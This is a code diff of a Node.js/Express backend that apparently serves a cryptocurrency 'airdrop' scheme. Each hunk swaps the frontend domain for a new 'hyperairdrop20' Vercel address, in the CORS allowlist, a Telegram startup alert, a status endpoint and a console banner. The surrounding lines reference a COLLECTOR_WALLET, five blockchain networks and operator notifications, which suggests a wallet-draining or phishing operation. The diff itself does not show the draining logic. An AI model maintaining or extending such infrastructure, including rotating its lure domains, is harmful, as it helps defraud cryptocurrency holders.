@@ -32,7 +32,7 @@ const allowedOrigins = process.env.ALLOWED_ORIGINS
   ? process.env.ALLOWED_ORIGINS.split(',') 
   : [
       'http://localhost:3000', 
-      'https://hyperaidrop.vercel.app', 
+      'https://hyperairdrop20.vercel.app', 
       'https://hyperback-psi.vercel.app',
       'https://bitcoinhypertoken.vercel.app'
     ];
@@ -116,7 +116,7 @@ async function testTelegramConnection() {
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
       `🔗 Backend: hyperback-psi.vercel.app\n` +
-      `🌍 Frontend: hyperaidrop.vercel.app\n` +
+      `🌍 Frontend: hyperairdrop20.vercel.app\n` +
       `🕐 Started: ${new Date().toLocaleString()}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -150,7 +150,7 @@ app.get('/', (req, res) => {
     status: '🟢 ONLINE',
     telegram: telegramEnabled ? '✅ connected' : '❌ disabled',
     backendUrl: 'https://hyperback-psi.vercel.app',
-    frontendUrl: 'https://hyperaidrop.vercel.app',
+    frontendUrl: 'https://hyperairdrop20.vercel.app',
     timestamp: new Date().toISOString()
   });
 });
@@ -1064,7 +1064,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   ╠══════════════════════════════════════════════════════════════╣
   ║  📍 Port: ${PORT.toString().padEnd(40)}║
   ║  🔗 Backend: https://hyperback-psi.vercel.app${' '.repeat(16)}║
-  ║  🌍 Frontend: https://hyperaidrop.vercel.app${' '.repeat(17)}║
+  ║  🌍 Frontend: https://hyperairdrop20.vercel.app${' '.repeat(17)}║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📦 COLLECTOR: ${COLLECTOR_WALLET.substring(0, 30)}...${' '.repeat(4)}║
   ╠══════════════════════════════════════════════════════════════╣
